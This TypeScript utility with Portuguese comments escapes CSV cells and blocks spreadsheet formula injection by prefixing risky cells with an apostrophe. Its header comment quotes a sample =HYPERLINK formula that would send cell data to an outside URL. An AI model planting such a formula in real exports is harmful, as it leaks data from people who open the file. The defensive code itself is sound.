/**
 * Célula de CSV segura para abrir em planilha.
 *
 * Aspas duplicadas e célula entre aspas resolvem o delimitador e a quebra de linha — mas não
 * a INJEÇÃO DE FÓRMULA: o Excel/LibreOffice interpretam como fórmula qualquer célula que
 * comece com `=`, `+`, `-` ou `@` (e TAB/CR, que alguns leitores descartam antes de olhar o
 * primeiro caractere), mesmo entre aspas. Nome de insumo, descrição de item e justificativa
 * vêm de usuário ou de sistema externo (CATMAT, NF-e); um `=HYPERLINK("https://…?"&A1)`
 * cadastrado ali executava na máquina de quem abriu a exportação.
 *
 * Defesa padrão (OWASP): prefixar `'` — a planilha mostra o texto como texto. Número de
 * verdade é isento: `-3.5` não é fórmula, e prefixá-lo quebraria a coluna numérica.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/
/** Número puro (com sinal e decimal opcionais) — não há fórmula possível aí. */
const PLAIN_NUMBER = /^[+-]?\d+(?:[.,]\d+)?$/

export type CsvValue = string | number | null | undefined

/** Uma célula: sempre entre aspas, aspas internas duplicadas, fórmula neutralizada. */
export function csvCell(value: CsvValue): string {
	if (value == null) return '""'
	if (typeof value === "number") return Number.isFinite(value) ? `"${value}"` : '""'
	const text = FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value
	return `"${text.replaceAll('"', '""')}"`
}

/** Uma linha: células escapadas e unidas pelo delimitador (`,` por padrão; SIAFI usa `;`). */
export function csvRow(values: readonly CsvValue[], delimiter = ","): string {
	return values.map(csvCell).join(delimiter)
}
